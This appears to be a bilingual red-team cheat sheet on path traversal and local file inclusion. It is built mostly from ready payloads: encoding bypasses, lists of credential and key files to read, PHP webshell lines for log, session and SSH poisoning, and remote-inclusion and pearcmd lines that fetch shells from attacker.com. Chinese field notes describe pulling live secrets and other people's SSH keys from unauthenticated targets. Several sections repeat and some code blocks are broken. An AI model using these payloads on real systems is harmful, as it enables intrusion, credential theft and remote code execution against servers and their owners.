# 路径穿越 / LFI（读文件 / 伪协议 / 日志投毒）
> 护网使用：授权、ROE、留痕、报告见 `../hw-rules/`。

---


> 手法索引「Nginx alias 缺斜杠」在 §22 下，用标题搜即可。站上已有 `/static` `/assets` `/img` 就可以打 `/static../`，不必先看见配置缺斜杠。没有这类前缀，走普通 `file=` 穿越，不要为了勾表空打。


## Path Traversal / Local File Inclusion (LFI)


## 1. CORE CONCEPT

**Path Traversal**: Read arbitrary files by escaping the intended directory with `../` sequences.
**LFI**: In PHP, when user input controls `include()`/`require()` — file is **executed** as PHP code, not just read.

```
http://target.com/index.php?page=home
→ Opens: /var/www/html/pages/home.php

Traversal attack:
http://target.com/index.php?page=../../../../etc/passwd
→ Opens: /etc/passwd
```

---

## 2. TRAVERSAL SEQUENCE VARIANTS

The filtering strategy determines which encoding to use:

### Basic
```
../../../etc/passwd
..\..\..\windows\system32\drivers\etc\hosts  (Windows)
```

### URL Encoding
```
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd     ← %2f = '/'
%2e%2e%5c%2e%2e%5c%2e%2e%5c                  ← %5c = '\'
```

### Double URL Encoding (when server decodes once, filter checks before decode)
```
%252e%252e%252f%252e%252e%252f  ← %25 = %, double-encoded %2e
..%252f..%252fetc%252fpasswd
```

### Unicode / Overlong UTF-8
```
..%c0%af..%c0%af     ← overlong UTF-8 encoding of '/'
..%c1%9c..%c1%9c     ← overlong UTF-8 encoding of '\'
..%ef%bc%8f          ← fullwidth solidus '／'
```

### Mixed Encodings
```
..%2F..%2Fetc%2Fpasswd
....//....//etc/passwd   ← double-dot with slash (filter strips single ../)
```

### Filter Strips `../` (so `../` becomes `../` after strip)
```
....//          ← becomes ../ after filter strips ../
..././          ← becomes ../ after filter strips ./
```

### Null Byte Injection (legacy PHP < 5.3.4)
```
../../../../etc/passwd%00.jpg   ← %00 truncates string, strips .jpg extension
../../../../etc/passwd%00.php
```

---

## 3. TARGET FILES AND ESCALATION TARGETS

### Linux
```
/etc/passwd                  ← user list (usernames, UIDs)
/etc/shadow                  ← password hashes (requires root-level file read)
/etc/hosts                   ← internal hostnames → pivot targets
/etc/hostname                ← server hostname
/proc/self/environ           ← process environment (DB creds, API keys!)
/proc/self/cmdline           ← process command line
/proc/self/fd/0              ← stdin file descriptor
/proc/[pid]/maps             ← memory maps (loaded libraries with paths)
/var/log/apache2/access.log  ← for log poisoning
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/auth.log            ← SSH attempt log
/var/mail/www-data            ← email for www-data user
/home/USER/.ssh/id_rsa       ← SSH private key
/home/USER/.ssh/authorized_keys
/home/USER/.bash_history     ← command history (credentials!)
/home/USER/.aws/credentials  ← AWS keys
/tmp/sess_SESSIONID          ← PHP session files (if session.save_path=/tmp)
```

### Web Application Config Files
```
/var/www/html/.env           ← Laravel/Node.js env vars
/var/www/html/config.php     ← PHP config
/var/www/html/wp-config.php  ← WordPress DB credentials
/etc/apache2/sites-enabled/  ← Apache vhosts
/etc/nginx/sites-enabled/    ← Nginx config
/usr/local/etc/nginx/nginx.conf
```

### Windows
```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\Windows\System32\config\SAM          ← NTLM hashes (often locked)
C:\inetpub\wwwroot\web.config           ← ASP.NET DB connection strings
C:\inetpub\wwwroot\global.asa
C:\xampp\htdocs\wp-config.php
C:\Users\Administrator\.ssh\id_rsa
C:\ProgramData\MySQL\MySQL Server 8\my.ini  ← MySQL config
```

---

## 4. PHP LFI → RCE TECHNIQUES

### Log Poisoning (most reliable when log is accessible)
**Step 1**: Inject PHP code into Apache/Nginx access log via User-Agent:
```http
GET / HTTP/1.1
User-Agent: <?php system($_GET['cmd']); ?>
```
**Step 2**: Include the log file via LFI:
```
?page=../../../../var/log/apache2/access.log&cmd=id
```

### SSH Log Poisoning
Inject PHP payload as SSH username:
```bash
ssh '<?php system($_GET["cmd"]); ?>'@target.com
```
Then include `/var/log/auth.log`.

### PHP Session File Poisoning
**Step 1**: Send PHP code in session-stored parameter (e.g., username), triggering storage in session file
**Step 2**: Include session file:
```
?page=../../../../tmp/sess_SESSIONID&cmd=id
```
Find session ID from cookie `PHPSESSID`.

### PHP Wrappers for RCE

**`php://expect` wrapper** (requires `expect` PHP extension):
```
?page=expect://id
```

**`php://input` wrapper** (combine LFI with POST body):
```
POST ?page=php://input
Body: <?php system('id'); ?>
```

**`data://` wrapper** (inject PHP directly as base64):
```
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id
```
(PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4= = `<?php system($_GET['cmd']); ?>`)

---

## 5. PHP FILTER WRAPPER (FILE CONTENT READ)

Use `php://filter` to base64-encode file content to avoid null bytes, binary data:
```
?page=php://filter/convert.base64-encode/resource=config.php
?page=php://filter/convert.base64-encode/resource=/etc/passwd
?page=php://filter/read=string.rot13/resource=config.php
?page=php://filter/convert.iconv.UTF-8.UTF-16LE/resource=config.php
```
Decode the returned base64 to see the file contents (including PHP source code).

**Chain filters** (multiple transforms to bypass input filters):
```
?page=php://filter/convert.base64-encode|convert.base64-encode/resource=/etc/passwd
```

---

## 6. REMOTE FILE INCLUSION (RFI) — WHEN ENABLED

If PHP's `allow_url_include = On` (rare but exists):
```
?page=http://attacker.com/shell.txt
?page=ftp://attacker.com/shell.php
```
Host a `shell.txt` with `<?php system($_GET['cmd']); ?>`.

---

## 7. SERVER-SPECIFIC PATH TRUNCATION

PHP has a historical path length limit. Pad with `.` or `/./` to truncate appended extension:
```
?page=../../../../etc/passwd/./././././././././././............ (255+ chars)
```
When server appends `.php`, the truncation drops it.

Or null byte if PHP < 5.3.4:
```
?page=../../../../etc/passwd%00
```

---

## 8. PARAMETER LOCATIONS TO TEST

```
?file=        ?page=        ?include=    ?path=
?doc=         ?view=        ?load=       ?read=
?template=    ?lang=        ?url=        ?src=
?content=     ?site=        ?layout=     ?module=
```

Also test: HTTP headers, cookies, form `action` values, import/upload features.

---

## 9. FILTER BYPASS CHECKLIST

When `../` is stripped or blocked:

```
□ Try URL encoding: %2e%2e%2f
□ Try double URL encoding: %252e%252e%252f
□ Try overlong UTF-8: ..%c0%af / ..%ef%bc%8f
□ Try mixed: ..%2F or ..%5C (backslash on Linux)
□ Try redundant sequences: ....// or ..././ (strip once → still ../)
□ Try null byte: /../../../etc/passwd%00
□ Try absolute path: /etc/passwd (if no path prefix added)
□ Try Windows UNC (Windows server): \\127.0.0.1\C$\Windows\win.ini
```

---

## 10. IMPACT ESCALATION PATH

```
Path traversal (read arbitrary files)
├── Read /etc/passwd → enumerate users
├── Read /proc/self/environ → find API keys, DB passwords in env
├── Read app config files → find credentials → horizontal movement
├── Read SSH private keys → direct server login
└── Find log paths → Log Poisoning → LFI RCE

LFI (PHP code inclusion)
├── Log poisoning → webshell
├── Session file poisoning → webshell  
├── php://input → direct code execution
├── data:// → direct code execution
└── php://filter → read PHP source code → find more vulnerabilities
```

---

## 11. LFI TO RCE ESCALATION PATHS

| Method | Requirements | Payload |
|---|---|---|
| Log Poisoning (Apache) | LFI + Apache access.log readable | Inject `<?php system($_GET['c']);?>` in User-Agent → include `/var/log/apache2/access.log` |
| Log Poisoning (SSH) | LFI + SSH auth.log readable | SSH as `<?php system('id');?>@target` → include `/var/log/auth.log` |
| Log Poisoning (Mail) | LFI + mail log readable | Send email with PHP in subject → include `/var/log/mail.log` |
| /proc/self/fd bruteforce | LFI + Linux | Bruteforce `/proc/self/fd/0` through `/proc/self/fd/255` for open file handles containing injected content |
| /proc/self/environ | LFI + CGI/FastCGI | Inject PHP in `User-Agent` header → include `/proc/self/environ` |
| iconv CVE-2024-2961 | glibc < 2.39, PHP with `php://filter` | `php://filter/convert.iconv.UTF-8.ISO-2022-CN-EXT/resource=` chain to heap overflow → RCE. Tool: cnext-exploits |
| phpinfo() assisted | LFI + phpinfo page accessible | Race condition: upload tmp file via multipart to phpinfo → read tmp path from response → include before cleanup |
| PHP Session | LFI + session file writable | Inject PHP into session via controllable session variable → include `/tmp/sess_SESSIONID` or `/var/lib/php/sessions/sess_SESSIONID` |
| Upload race | LFI + upload endpoint | Upload PHP file → include before server-side validation/deletion |

---

## 12. PHP WRAPPER EXPLOITATION MATRIX

### php://filter (most powerful, always try first)

```text
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php
php://filter/convert.iconv.utf-8.utf-16/resource=index.php
php://filter/zlib.deflate/resource=index.php
```

**Filter chain RCE** (synacktiv php_filter_chain_generator):

- Chain multiple `convert.iconv` filters to write arbitrary bytes without file upload
- Tool: `synacktiv/php_filter_chain_generator` → generates chain that writes PHP code
- `python3 php_filter_chain_generator.py --chain '<?php system("id");?>'`

**convert.iconv + dechunk oracle** (blind file read):

- Tool: `synacktiv/php_filter_chains_oracle_exploit` (filters_chain_oracle_exploit)
- Enables blind LFI to read file contents character by character

### php://input

```text
POST vulnerable.php?page=php://input
Body: <?php system('id'); ?>
```

Requires `allow_url_include=On`

### data://

```text
data://text/plain,<?php system('id');?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
data:text/plain,<?php system('id');?>    ← note: no double slash variant also works
```

### phar://

```text
phar://uploaded.phar/test.php
```

Triggers deserialization of phar metadata → RCE via POP chain (requires file upload of crafted phar, can be disguised as JPEG)

### zip://

```text
zip://uploaded.zip%23shell.php
```

### expect://

```text
expect://id
```

Requires `expect` extension (rare)

---

## 13. PEARCMD LFI EXPLOITATION

When `pearcmd.php` is accessible via LFI (common in Docker PHP images):

| Method | Payload |
|---|---|
| config-create | `/?file=pearcmd.php&+config-create+/<?=phpinfo()?>+/tmp/shell.php` |
| man_dir | `/?file=pearcmd.php&+-c+/tmp/shell.php+-d+man_dir=<?=phpinfo()?>+-s+` |
| download | `/?file=pearcmd.php&+download+http://attacker.com/shell.php` |
| install | `/?file=pearcmd.php&+install+http://attacker.com/shell.tgz` |

---

## 14. WINDOWS-SPECIFIC LFI TECHNIQUES

**FindFirstFile wildcard** (Windows only):

- `<` matches any single character, `>` matches any sequence (similar to `?` and `*` but in file APIs)
- `php<<` can match `php5`, `phtml`, etc.
- `..\..\windows\win.ini` → use `<<` for fuzzy matching: `..\..\windows\win<<`

---

## 15. PARAMETER NAMING PATTERNS (HIGH-FREQUENCY TARGETS)

Based on vulnerability research statistical analysis:

| Parameter Name | Frequency | Context |
|---|---|---|
| `filename`, `file`, `path` | Very High | Direct file operations |
| `page`, `include`, `template` | High | Template/page inclusion |
| `url`, `src`, `href` | High | Resource loading |
| `download`, `read`, `load` | Medium | File download/read |
| `dir`, `folder`, `root` | Medium | Directory operations |
| `hdfile`, `inputFile`, `XFileName` | Low | CMS/middleware specific |
| `FileUrl`, `filePath`, `docPath` | Low | Enterprise app specific |

High-frequency vulnerable endpoints:

`down.php`, `download.jsp`, `download.asp`, `readfile.php`, `file_download.php`, `getfile.php`, `view.php`

---

## 16. LFI TO RCE — ESCALATION PATHS

### 1. /proc/self/fd Brute-Force
```
# When file upload exists but path is unknown:
# Uploaded files get temporary fd in /proc/self/fd/
# Brute-force fd numbers:
/proc/self/fd/0 through /proc/self/fd/255
# Include the temp file before it's cleaned up
```

### 2. /proc/self/environ Poisoning
```
# If User-Agent is reflected in process environment:
GET /vuln.php?page=/proc/self/environ
User-Agent: <?php system($_GET['c']); ?>
```

### 3. Log Poisoning
```
# Apache access log:
GET /<?php system($_GET['c']); ?> HTTP/1.1
# Then include: /var/log/apache2/access.log

# SSH auth log (username field):
ssh '<?php system($_GET["c"]); ?>'@target
# Then include: /var/log/auth.log

# Mail log (SMTP subject):
MAIL FROM:<attacker@evil.com>
RCPT TO:<victim@target.com>
DATA
Subject: <?php system($_GET['c']); ?>
.
# Then include: /var/log/mail.log
```

### 4. PHP Session File Poisoning
```
# Set session variable to PHP code:
GET /page.php?lang=<?php system($_GET['c']); ?>
# Session file: /tmp/sess_PHPSESSID or /var/lib/php/sessions/sess_PHPSESSID
# Include the session file
```

### 5. phpinfo() Assisted LFI
```
# Race condition: upload via phpinfo() temp file
# 1. POST multipart file to phpinfo() page → reveals tmp_name (/tmp/phpXXXXXX)
# 2. Include the temp file before PHP cleans it up
# Requires many concurrent requests (race window ~10ms)
```

### 6. iconv CVE-2024-2961
```
# glibc iconv buffer overflow in PHP filter chains
# Tool: cfreal/cnext-exploits
# Converts LFI to RCE without needing writable paths or log poisoning
```

---

## 17. PHP WRAPPER EXPLOITATION MATRIX

### php://filter (file read without execution)
```
# Base64 encode source code:
php://filter/convert.base64-encode/resource=index.php

# ROT13:
php://filter/read=string.rot13/resource=index.php

# Chain multiple filters:
php://filter/convert.iconv.UTF-8.UTF-16/resource=index.php

# Zlib compression:
php://filter/zlib.deflate/resource=index.php

# NEW: Filter chain RCE (synacktiv php_filter_chain_generator)
# Generates chains that write arbitrary content via iconv conversions
# Tool: synacktiv/php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
# Produces: php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...|/resource=php://temp
```

### convert.iconv + dechunk Oracle (blind file read)
```
# Error-based oracle: determine if first byte of file matches a character
# Tool: synacktiv/php_filter_chains_oracle_exploit
# Reads files byte-by-byte through error/behavior differences
```

### data:// Wrapper
```
# Execute arbitrary PHP:
data://text/plain,<?php system('id'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# Bypass when data:// is filtered but data: (without //) works:
data:text/plain,<?php system('id'); ?>
```

### expect:// Wrapper
```
expect://id
expect://ls
# Requires expect extension (rare but check)
```

### php://input
```
POST /vuln.php?page=php://input
Content-Type: application/x-www-form-urlencoded

<?php system('id'); ?>
```

### zip:// and phar:// Wrappers
```
# zip://: Upload ZIP containing PHP file
zip:///tmp/upload.zip#shell.php

# phar://: Triggers deserialization of phar metadata!
phar:///tmp/upload.phar/anything
# Create malicious phar with crafted metadata object
# Can chain to RCE via POP gadget chains (like PHP deserialization)
# Phar can be disguised as JPG (polyglot phar-jpg)
```

### wrapwrap (prefix/suffix injection)
```
# Tool: ambionics/wrapwrap
# Adds arbitrary prefix and suffix to file content via filter chains
# Useful for converting file read into XXE, SSRF, or deserialization trigger
```

---

## 18. PEARCMD LFI TO RCE

When PEAR is installed and `register_argc_argv=On` (common in Docker PHP images):

```
# Method 1: config-create (write arbitrary content to file)
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/shell.php

# Method 2: man_dir (change docs directory to write path)
GET /index.php?+-c+/tmp/shell.php+-d+man_dir=<?=system($_GET[0])?>+-s+/usr/local/lib/php/pearcmd.php

# Method 3: download (fetch remote file)
GET /index.php?+download+http://attacker.com/shell.php&file=/usr/local/lib/php/pearcmd.php

# Method 4: install (install remote package)
GET /index.php?+install+http://attacker.com/evil.tgz&file=/usr/local/lib/php/pearcmd.php
```

### Windows FindFirstFile Wildcard
```
# Windows << and > wildcards in file paths:
# << matches any extension, > matches single char
include("php<<");      # Matches any .php* file
include("shel>");      # Matches shell.php if only 1 char follows
# Useful when exact filename is unknown
```

---

## 19. PARAMETER NAMING PATTERNS & HIGH-FREQUENCY ENDPOINTS

### Common Vulnerable Parameter Names
```
filename    filepath    path        file        url
template    page        include     dir         document
folder      root        pg          lang        doc
conf        data        content     name        src
inputFile   hdfile      XFileName   FileUrl     readfile
```

### High-Frequency Vulnerable Endpoints
| Endpoint Pattern | Frequency |
|---|---|
| `down.php` / `download.php` | Very High |
| `download.jsp` / `download.do` | Very High |
| `download.asp` / `download.aspx` | High |
| `readfile.php` / `file.php` | High |
| `export` / `report` endpoints | Medium |
| `template` / `preview` endpoints | Medium |

### Bypass Technique Distribution (from field research)
| Technique | Prevalence |
|---|---|
| Absolute path direct access | Most common |
| WEB-INF/web.xml read (Java) | Common |
| Base64 encoded path parameter | Moderate |
| Double URL encoding | Moderate |
| UTF-8 overlong encoding (`%c0%ae`) | Rare but effective |
| Null byte truncation (`%00`) | Legacy (PHP < 5.3.4) |

---

## 20. JAVA / SPRING PATH TRAVERSAL

### Spring Resource Loading

```java
// Vulnerable patterns — user input flows into resource path
ClassPathResource r = new ClassPathResource(userInput);
getClass().getResourceAsStream("/templates/" + userInput);
servletContext.getResourceAsStream("/WEB-INF/" + userInput);
```

```text
# Read WEB-INF deployment descriptor
GET /download?file=../WEB-INF/web.xml
GET /download?file=../WEB-INF/classes/application.properties
GET /download?file=../WEB-INF/classes/META-INF/persistence.xml

# Spring Boot specific
GET /download?file=../WEB-INF/classes/application.yml
GET /download?file=../WEB-INF/classes/bootstrap.properties
```

### High-value Java targets

```text
/WEB-INF/web.xml                        ← servlet mappings, filter chains, security constraints
/WEB-INF/classes/application.properties  ← DB creds, API keys, Spring config
/WEB-INF/classes/application.yml         ← same, YAML format
/WEB-INF/lib/                            ← application JARs (download for decompilation)
/META-INF/MANIFEST.MF                    ← build metadata, main class
/META-INF/context.xml                    ← Tomcat datasource definitions
```

### Spring MVC `ResourceHttpRequestHandler`

When static resources are served via `spring.resources.static-locations`:
```text
GET /static/..%252f..%252fWEB-INF/web.xml
GET /static/..;/..;/WEB-INF/web.xml       ← Tomcat path parameter normalization
```

---

## 21. TOMCAT-SPECIFIC TRICKS

### Path Parameter Normalization (`/..;/`)

Tomcat treats `;` as a path parameter delimiter and strips everything from `;` to the next `/` **before** path resolution, but upstream proxies or WAFs may not:

```text
GET /app/..;/manager/html           ← Tomcat resolves to /manager/html
GET /app/..;jsessionid=x/..;/WEB-INF/web.xml
```

**WAF bypass chain**: reverse proxy sees `/app/..;/manager/html` as a path under `/app/` (allowed), but Tomcat normalizes `..;` to `..` and traverses up.

### AJP Ghostcat (CVE-2020-1938)

Apache JServ Protocol (AJP, port 8009) exposed to the network allows arbitrary file read and JSP execution:

```text
# Read any file through AJP
python3 ajpShooter.py http://target:8009 /WEB-INF/web.xml read

# Include attacker-controlled file as JSP for execution
python3 ajpShooter.py http://target:8009 / eval --ajp-secret="" \
  -H "javax.servlet.include.request_uri:/anything" \
  -H "javax.servlet.include.servlet_path:/uploads/avatar.txt"
```

**Conditions**: AJP connector on port 8009 reachable (default Tomcat, often not firewalled in Docker/internal). `secretRequired` unset prior to Tomcat 9.0.31.

### Tomcat double-URL-decode

```text
GET /%252e%252e/%252e%252e/etc/passwd
```

---

## 22. NGINX ALIAS MISCONFIGURATION

### Nginx alias 缺斜杠（手法索引有指针）

认：站上已有 `/static`、`/assets`、`/img`、`/files` 这类前缀（黑盒看不见 nginx 配置，有前缀就打）；或 Caddy 模板吃用户输入。

打：

1. `GET /static../etc/passwd`、`GET /static../etc/nginx/nginx.conf`、`GET /assets..%2f..%2fetc%2fpasswd`。
2. 对照：`/static/../etc/passwd` 常被规范化挡掉，**缺斜杠那一枪**才是 alias 替换前缀。
3. Caddy 模板面：输入里试 `{{readFile "/etc/passwd"}}`、`{{.Req.Host}}`。读到文件才算，只反射 Host 不算本条。

算成：读到 web 根以外的配置 / 密钥 / `nginx.conf`。只能列静态目录里本来就有的 css/图 → 没成。

假点：404；alias 两边都有斜杠，规范化后出不去；Caddy 模板不执行用户输入。单站没中不删手法索引这行。有静态前缀就打，不必先看见 nginx 配置。普通 `file=` 穿越仍走上面通用段，两枪不互相替代。

### The trailing-slash trap

```nginx
# VULNERABLE — missing trailing slash on location
location /assets {
    alias /data/;
}
```

Nginx maps `/assets../etc/passwd` to `/data/../etc/passwd` to `/etc/passwd` because `alias` replaces the exact location prefix (`/assets`) with the alias path (`/data/`), and `../` in the remainder traverses out.

```text
GET /assets../etc/passwd HTTP/1.1
GET /assets..%2f..%2fetc%2fpasswd HTTP/1.1
```

**Correct configuration**:
```nginx
location /assets/ {
    alias /data/;
}
```

### Off-by-one in `location` + `alias`

```nginx
location /img {
    alias /var/images;
}
# /img../secret -> /var/images/../secret -> /var/secret
```

Rule: when `alias` is used, the `location` prefix and the alias path must both end with `/`, or neither does.

---

## 23. NODE.JS PATH MODULE QUIRKS

### `path.join()` with URL-encoded input

```javascript
const path = require('path');

app.get('/files/:name', (req, res) => {
    const filePath = path.join(__dirname, 'uploads', req.params.name);
    res.sendFile(filePath);
});
```

Express URL-decodes `req.params` before `path.join`:

```text
GET /files/..%2f..%2f..%2fetc%2fpasswd
req.params.name = "../../../etc/passwd" (already decoded)
path.join(__dirname, 'uploads', '../../../etc/passwd') = /etc/passwd
```

### `express.static()` quirks

- Calls `decodeURIComponent` on the path, then `path.normalize()`
- Double encoding (`%252e%252e%252f`) bypasses if middleware decodes once, then `express.static` decodes again
- Null bytes (`%00`) rejected in modern Node.js (v14+), but legacy versions may truncate

### `url.parse()` vs `new URL()` confusion

```javascript
// Legacy: url.parse() does NOT resolve path traversal
const parsed = require('url').parse(userInput);
// parsed.pathname may contain ../

// Modern: new URL() normalizes the path
const parsed = new URL(userInput, 'http://localhost');
// parsed.pathname has ../ resolved
```

Apps mixing `url.parse()` and `path.join()` may allow traversal that `new URL()` would have normalized.

### 仓库根当静态（koa-static / express.static 指到 cwd）

认：页面或 `/package.json` 能直接 GET 到 Node 工程文件（`package.json`、`routes/`、`index.js`），说明静态中间件指的是仓库根，不是 `public/`。

打：不登录。顺着 node-config 环境名打 `/config/online.yml` `/config/default.yml` `/config/production.yml` `/config/pre.yml` `/config/dev.yml`，以及 `.env`。不必先打 `../`。

算成：yml/json 里是**完整库账密或云密钥实值**。只有 README / 无钥源码 / 只有端口的空模板 → 没成（信息级不报）。

假点：静态根只出 `public`；`package.json` 200 但 config 404；yml 没有账密。单站没中不删这套认法。

### 静态桶上的 .NET 发布物（aspx 还能 GET）

认：对象存储 / 静态桶（MSS `product-fe-*` 一类）上挂着旧 .NET 发布物。aspx 源码还能 GET，不是编译后才吐。同目录 `web.config` 常被 WAF 拦。不是 Node 仓库根（那枪见上一节）。

打：不登录。`web.config` 456 别停，打同目录 `App.config`、`Web.Release.config`、`*.exe.config`、`bin/*.dll.config`。有 bin 再扫 `*.pdb` 看有没有连配置。

算成：完整账密或 DeveloperToken，不是 `ENTER_YOUR_*` 占位。

假点：aspx 200 但 config 404；只有源码没有钥；占位符口令。密钥实值不进库。单站没中不删这套认法。

### 公网 VS Code 系读进程环境

认：公网 code-server；打开 `/login` 直接进编辑器（无登录墙）。

打：不登录 `GET /remote-resource?path=/proc/self/status` 看 Uid，再 `path=/proc/self/environ`。公网 VS Code 系、页面/`_static` 里 `AuthType.None` 是常见皮，没有这个字仍打。不要停在 README。environ 里若有 SSH 私钥（常是 Base64 PEM）：**解开后假钥对照** 连环境里的 Git 主机，真钥 Hello 用户名、假钥 Permission denied。只抄到字符串不算认钥。

算成：environ 里是**他人**邮箱和完整 SSH 私钥，且真钥能问出 Git 用户名。只有安装脚本 / 公开模板 → 没成。

假点：path 要登录；只读到 README；真假钥同一句 Permission denied。认证枚举名不是 None 不算假点。单站没中不删手法索引这行。密钥实值不进库。

---

## 24. IIS SHORT FILENAME ENUMERATION (~1 TILDE TRICK)

### Concept

Windows NTFS generates 8.3 short filenames (e.g., `LONGFI~1.TXT`). IIS responds differently for valid vs invalid short name prefixes.

### Detection method

```text
GET /W~1.ASP HTTP/1.1  -> 404 (name pattern valid)
GET /Z~1.ASP HTTP/1.1  -> 400 (bad request)
```

Differential response leaks whether a file starting with that prefix exists.

### Enumeration process

```text
Step 1: /A~1* -> 404 = file starting with A exists
Step 2: /AB~1* -> 404 = file starting with AB exists
Step 3: /ABCDEF~1.A* -> 404 = extension starts with A
```

### Tools

```bash
java -jar iis_shortname_scanner.jar https://target.com/
```

### Impact

- Discover hidden backups, config files, source code
- Shorter brute-force space: 8.3 format limits character set
- Works even when directory listing is disabled


---

## 补充与进阶

## 文件包含 / 路径遍历实战参考
- 路径遍历与文件包含常组合使用 → `path-traversal-lfi.md`
- LFI 包含 Webshell 执行命令 → `injection.md`

> 分类: LFI检测 → 路径遍历 → 日志投毒 → 伪协议 → Session文件 → /proc/self/environ → RCE

> **last_updated**: 2026-06-04 | **tested_against**: PHP 8.x, Apache 2.4, Nginx 1.24
---

---

## 1. LFI / 路径遍历检测

---

### 1.1 基础检测

```bash

---

# === LFI (本地文件包含) ===
?page=../../../../etc/passwd
?page=../../../../etc/passwd%00           # 空字节截断 (PHP <5.3.4)
?page=....//....//....//....//etc/passwd  # 路径规范化绕过
?page=..%2f..%2f..%2f..%2fetc%2fpasswd   # URL编码
?page=..%252f..%252f..%252fetc%252fpasswd # 双重URL编码

---

# === RFI (远程文件包含) ===
?page=http://attacker.com/shell.txt
?page=//attacker.com/share/shell.txt       # UNC路径
```

---

### 1.2 敏感文件速查

```bash

---

## 2. PHP 伪协议 (Wrapper)

---

### 2.1 常用伪协议

```php

---

## === php://filter (读源码) ===

---

## Base64 编码输出 → 防止 PHP 执行
?page=php://filter/convert.base64-encode/resource=index.php
?page=php://filter/read=convert.base64-encode/resource=config.php
?page=php://filter/convert.base64-encode/resource=../../../../etc/passwd

---

## 链式过滤器 (多重编码)
?page=php://filter/read=convert.base64-encode|convert.base64-encode/resource=index.php

---

## 字符串过滤 (rot13)
?page=php://filter/read=string.rot13/resource=index.php

---

## === php://input (POST 中带 PHP 代码) ===

---

## 需要 allow_url_include=On
POST /index.php?page=php://input HTTP/1.1
Content-Type: application/x-www-form-urlencoded

<?php system('id');?>

---

## === php://fd ===
?page=php://fd/0     # 读取 stdin (当前请求body)

---

## === data:// (内联数据) ===

---

## 需要 allow_url_include=On
?page=data://text/plain,<?php system('id');?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+

---

## === expect:// (直接执行命令) ===

---

## 需要 expect 扩展
?page=expect://id
?page=expect://whoami

---

## === phar:// (Phar 反序列化) ===
?page=phar://uploaded_file.jpg/shell.php
```

---

### 2.2 伪协议绕过关键词过滤

```php

---

## php:// 被过滤 → 大小写或编码
?page=pHp://filter/...
?page=PhP://filter/...
?page=php://FilTer/...           # filter 大写绕过

---

## resource= 被过滤 → 使用 /resource= (双斜杠)
?page=php://filter/convert.base64-encode/resource=/etc/passwd

---

## flag/flag= 被过滤
?page=php://filter/convert.base64-encode/resource=/fl\ag
```

---

---

## 3. LFI → RCE 全链路

---

### 3.1 日志投毒 (Log Poisoning)

```bash

---

## === Apache access.log 投毒 ===

---

## Step1: 发起含 PHP 代码的请求
curl -H "User-Agent: <?php system('id');?>" http://target.com/

---

## 或用 netcat:
echo -e "GET /<?php system('id');?> HTTP/1.1\r\nHost: target.com\r\n\r\n" | nc target.com 80

---

## Step2: 包含日志文件
?page=../../../../var/log/apache2/access.log

---

## 常见日志路径:
/var/log/apache2/access.log          # Debian/Ubuntu
/var/log/apache2/error.log
/var/log/httpd/access_log            # CentOS/RHEL
/var/log/httpd/error_log
/var/log/nginx/access.log            # Nginx
/var/log/nginx/error.log
/var/log/vsftpd.log                  # FTP
/var/log/sshd.log                    # SSH
/var/log/mail.log                    # Mail
/var/log/auth.log                    # Auth (Debian/Ubuntu)
/var/log/secure                      # Auth (CentOS/RHEL)
```

---

### 3.2 /proc/self/environ (进程环境注入)

```bash

---

## Step1: User-Agent 注入 PHP 代码
curl -H "User-Agent: <?php system('id');?>" http://target.com/index.php?page=/proc/self/environ

---

## 如果 User-Agent 被 WAF/IDS 检测 → 换其他 CGI 变量
```

---

### 3.3 Session 文件包含

```php

---

## PHP Session 文件路径:
/var/lib/php/sessions/sess_<PHPSESSID>
/tmp/sess_<PHPSESSID>

---

## Step1: 注册 session, 注入 PHP 代码

---

## 登录/注册页面 → 用户名填入: <?php system('id');?>

---

## 或通过 URL:
?PHPSESSID=../../../../tmp/sess_h4x0r

---

## Step2: 包含 session 文件
?page=../../../../var/lib/php/sessions/sess_<PHPSESSID>
```

---

### 3.4 文件上传 + LFI

```bash

---

## Step1: 上传图片马 (带 PHP 代码的合法图片)

---

## 文件名: evil.jpg 内容: GIF89a<?php system('id');?>

---

## Step2: LFI 包含:
?page=uploads/evil.jpg

---

## → PHP 代码被执行
```

---

### 3.5 SSH Auth Log 投毒

```bash

---

## Step1: SSH 登录, 用户名含 PHP 代码
ssh '<?php system($_GET[1]);?>'@target.com

---

## Step2: 包含 SSH 日志
?page=../../../../var/log/auth.log&1=id

---

## 或
?page=../../../../var/log/secure&1=id
```

---

### 3.6 Email Log 投毒

```bash

---

## 利用 SMTP 投毒 /var/log/mail.log

---

## 发邮件到目标服务器上的用户, 主题含 PHP 代码

---

## 包含 /var/log/mail.log
```

---

---

## 4. 路径遍历绕过

---

### 4.1 基础绕过

```bash

---

## ../ 被过滤 → 各种变体
....//                  → 过滤一次 ../ 后剩 ../
..;/
..%2f
%2e%2e%2f               # URL编码
%252e%252e%252f         # 双重URL编码
..%c0%af                # 宽字节截断
..%ef%bc%8f             # Unicode 全角斜线

---

### 4.2 绝对路径限制绕过

```bash

---

# 必须 /var/www/html/ 开头

---

# → 路径规范化绕过
/var/www/html/../../../../etc/passwd
/var/www/html/..\..\..\..\etc\passwd   (Windows)
```

---

### 4.3 文件后缀限制绕过

```bash

---

# 必须 .php 结尾:
?page=../../../../etc/passwd%00.php         # 空字节截断
?page=../../../../etc/passwd/.              # 末尾 /.
?page=../../../../etc/passwd/               # 末尾 /
?page=../../../../etc/passwd%2500.php       # 双重编码空字节
?page=php://filter/convert.base64-encode/resource=index    # 不写后缀

---

# 在某些 PHP 版本, / 绕过后缀检查:
?page=../../../../etc/passwd/.
```

---

---

## 5. 特殊 LFI 技巧

---

### 5.1 /proc/ 文件系统

```bash
/proc/self/environ         # 环境变量 (可能含秘密)
/proc/self/fd/0            # stdin
/proc/self/fd/1            # stdout
/proc/self/fd/2            # stderr
